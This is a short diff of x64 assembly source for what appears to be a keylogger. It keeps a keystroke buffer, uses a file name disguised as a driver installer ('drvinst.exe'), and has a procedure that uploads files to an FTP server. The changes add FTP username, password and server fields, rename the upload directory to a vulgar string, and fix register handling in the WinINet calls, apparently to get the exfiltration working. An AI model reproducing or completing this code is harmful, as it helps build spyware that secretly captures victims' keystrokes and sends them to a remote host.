@@ -90,13 +90,15 @@ VK_LEFT equ 25h
 	lpTargetfilename	db	'\drvinst.exe',0
 	hfile			dq	0
 	lpkeybuffer		db	30h dup(0)
-	lpPcname		db	'xxxxhot',0
+	lpPcname		db	'sudespussy',0
 	lpKeyState		db	100h dup(0)
-	lpascii			db	8h(0)
+	lpascii			db	4h(0)
 	biglow			db	0
 	ramsize			db	10h dup(0)
 	lpszAgent		db 4h dup(0)
-
+	lpszUserName	db '',0
+	lpszPassword	db '',0
+	lpszServerName  db '',0
 	lpclose			db	8h dup(0)
 
 
@@ -109,12 +111,12 @@ send proc
 	; ---- This part for send files to ftp
 	xor rax,rax
 	mov rax, INTERNET_FLAG_ASYNC
-
-	mov qword ptr 20h[rsp], rax
+	xor r9,r9
+	mov qword ptr 20h[rsp], r9
 	lea rcx, lpszAgent
 	xor rdx,rdx
 	xor r8,r8
-	xor r9,r9
+	
 	call InternetOpenA 
 
 	
@@ -140,7 +142,7 @@ send proc
 
 
 
-	mov ecx, eax
+	mov rcx, rax
 	lea rdx, lpPcname
 	call FtpCreateDirectoryA
 	
